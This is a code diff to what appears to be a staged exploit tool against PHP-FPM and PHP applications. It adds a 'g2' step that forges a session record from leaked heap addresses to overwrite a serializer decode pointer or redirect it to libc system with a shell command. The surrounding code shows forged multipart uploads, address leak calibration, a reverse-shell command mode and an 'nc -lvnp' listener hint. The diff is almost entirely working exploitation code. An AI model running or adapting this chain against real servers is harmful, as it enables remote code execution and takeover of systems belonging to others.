@@ -20,6 +20,7 @@ sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports
 
 from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
 from tool.modules import chain_stage as chain_stage_module  # noqa: E402
+from tool.modules import g2_chain as g2_chain_module  # noqa: E402
 from tool.modules import leak_stage as leak_stage_module  # noqa: E402
 from tool.modules import producer_fpmwiki as producer_stage  # noqa: E402
 from tool.modules import producer_modphp as modphp_producer_stage  # noqa: E402
@@ -72,8 +73,8 @@ ID_LINE = re.compile(
     rb"gid=[0-9]+\([A-Za-z0-9_.-]+\) groups=[^\r\n]+$"
 )
 
-# argv-driven stage list (receipt ladder order): producer -> write_stage -> leak -> chain; recon reads.
-STAGES = ("recon", "producer", "write_stage", "leak", "chain")
+# argv-driven stage list (receipt ladder order): producer -> write_stage -> leak -> g2 -> chain; recon reads.
+STAGES = ("recon", "producer", "write_stage", "leak", "g2", "chain")
 
 
 def run_producer_step(
@@ -230,6 +231,92 @@ def run_leak_step(
     rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
     (output / "result.json").write_text(rendered)
     return summary, output / "result.json"
+
+
+def run_g2_step(args) -> int:
+    """G2 FPM offline record plan: profile arithmetic plus record bytes.
+
+    No transport exists on this path: --live is refused with a JSON error. The
+    record is built from operator supplied X, P and B0 plus the fixed .data
+    decode slot or an explicit target. --step g2 never guesses an address and
+    never opens a socket.
+    """
+    if args.output is None:
+        stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
+        args.output = HERE.parent / "files" / "io" / f"g2-{stamp}"
+    args.output.mkdir(parents=True, exist_ok=True)
+
+    if args.live:
+        summary = {
+            "step": "g2",
+            "dry_run": False,
+            "sent": False,
+            "error": "ValueError: --step g2 has no transport (offline record "
+                     "plan only); use --dry-run",
+        }
+        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+        (args.output / "result.json").write_text(rendered)
+        print(rendered, end="")
+        return 2
+
+    missing = [
+        flag for flag, value in (
+            ("--g2-x", args.g2_x), ("--g2-p", args.g2_p),
+            ("--g2-b0", args.g2_b0),
+        ) if value is None
+    ]
+    if missing:
+        summary = {
+            "step": "g2",
+            "dry_run": True,
+            "sent": False,
+            "error": "ValueError: --step g2 requires " + ", ".join(missing)
+                     + " (hex addresses; the plan never guesses them)",
+        }
+        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+        (args.output / "result.json").write_text(rendered)
+        print(rendered, end="")
+        return 2
+
+    try:
+        emitted = g2_chain_module.plan(
+            x=g2_chain_module.hex_int(args.g2_x, "--g2-x"),
+            p=g2_chain_module.hex_int(args.g2_p, "--g2-p"),
+            b0=g2_chain_module.hex_int(args.g2_b0, "--g2-b0"),
+            total=args.g2_total,
+            command=args.command if args.command is not None else "id;exit;#",
+            value=args.g2_value,
+            libc_base=(
+                g2_chain_module.hex_int(args.libc_base, "--libc-base")
+                if args.libc_base is not None else None),
+            target=(
+                g2_chain_module.hex_int(args.g2_target, "--g2-target")
+                if args.g2_target is not None else None),
+        )
+    except (OSError, TypeError, ValueError) as error:
+        summary = {
+            "step": "g2",
+            "dry_run": True,
+            "sent": False,
+            "error": f"{type(error).__name__}: {error}",
+        }
+        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+        (args.output / "result.json").write_text(rendered)
+        print(rendered, end="")
+        return 2
+
+    record = emitted.pop("record")
+    record_path = args.output / "g2-record.bin"
+    record_path.write_bytes(record)
+    emitted["step"] = "g2"
+    emitted["artifacts"] = {
+        record_path.name: {"bytes": len(record),
+                           "sha256": hashlib.sha256(record).hexdigest()},
+    }
+    rendered = json.dumps(emitted, indent=2, sort_keys=True) + "\n"
+    (args.output / "result.json").write_text(rendered)
+    print(rendered, end="")
+    return 0
 
 
 def parse_url(value: str) -> tuple[str, int, str, str]:
@@ -572,8 +659,9 @@ def main() -> int:
         "--step producer (fpmwiki/modphp/unser producer modules: offline "
         "byte-build default, --live to fire), --step write_stage (dry: final "
         "forged multipart bytes through the COMPACT engine, no send), --step leak "
-        "(dry modphp calibration plan, no transport), or --step "
-        "chain (modphp: ordered "
+        "(dry modphp calibration plan, no transport), --step g2 (offline FPM "
+        "php_binary record plan from explicit X, P and B0; no transport), or "
+        "--step chain (modphp: ordered "
         "producer plus consumer sequence, dry default; fpm targets: legacy "
         "blocker-hold + rearm + forged staged multipart)"
     )
@@ -591,7 +679,12 @@ def main() -> int:
         choices=tuple(BINARY_PROFILES),
         help="per-build constants; defaults to the target's bound profile",
     )
-    parser.add_argument("--command", default="id", help="chain command payload (default: id)")
+    parser.add_argument(
+        "--command",
+        default=None,
+        help="chain command payload (default: id; --step g2 default: id;exit;# "
+             "padded to the 32 byte php_binary key)",
+    )
     parser.add_argument("--lhost", default="127.0.0.1")
     parser.add_argument("--lport", default=4444, type=int)
     parser.add_argument(
@@ -666,6 +759,44 @@ def main() -> int:
         default=0,
         help="write_stage: dso_deltas ordinal (see attempt())",
     )
+    parser.add_argument(
+        "--g2-x",
+        default=None,
+        help="--step g2: session record buffer zend_string X (hex)",
+    )
+    parser.add_argument(
+        "--g2-p",
+        default=None,
+        help="--step g2: stale php_unserialize_data P (hex)",
+    )
+    parser.add_argument(
+        "--g2-b0",
+        default=None,
+        help="--step g2: stale var_dtor_entries B0 (hex)",
+    )
+    parser.add_argument(
+        "--g2-total",
+        type=int,
+        default=None,
+        help="--step g2: session record length (default: profile lab geometry)",
+    )
+    parser.add_argument(
+        "--g2-target",
+        default=None,
+        help="--step g2: 16-byte aligned write target (default: "
+             "ps_serializers[2].decode 0x14c1b60)",
+    )
+    parser.add_argument(
+        "--g2-value",
+        default=None,
+        help="--step g2: serialized long written at the target "
+             "(default i:1;; ignored with --libc-base)",
+    )
+    parser.add_argument(
+        "--libc-base",
+        default=None,
+        help="--step g2: libc base, system = base + profile system offset",
+    )
 
 
     parser.add_argument(
@@ -676,6 +807,11 @@ def main() -> int:
         "for the disclosure window and reuse prior addresses on plain responses)",
     )
     args = parser.parse_args()
+
+    if args.step == "g2":
+        if args.producer:
+            parser.error("--producer does not apply to --step g2 (offline record plan)")
+        return run_g2_step(args)
 
     if args.producer and args.step not in ("producer", "chain"):
         parser.error("--producer only applies to --step producer or --step chain")
@@ -771,8 +907,8 @@ def main() -> int:
 
     payload = None
     if args.step == "write_stage" or (args.step == "chain" and not sequence_chain):
-        payload = command_mode(args.command, args.lhost, args.lport)
-        if args.command == "revshell":
+        payload = command_mode(args.command or "id", args.lhost, args.lport)
+        if (args.command or "id") == "revshell":
             print(f"[i] payload command: {payload}")
             print(f"[i] start the listener first, e.g.: nc -lvnp {args.lport}")
     if args.step == "chain" and not sequence_chain:
@@ -971,7 +1107,7 @@ def main() -> int:
             "step": "chain",
             "profile": PROFILE,
             "target": {"url": url, "host": host, "port": port, "path": path},
-            "command": args.command,
+            "command": args.command or "id",
             "lhost": args.lhost,
             "lport": args.lport,
             "payload": payload,
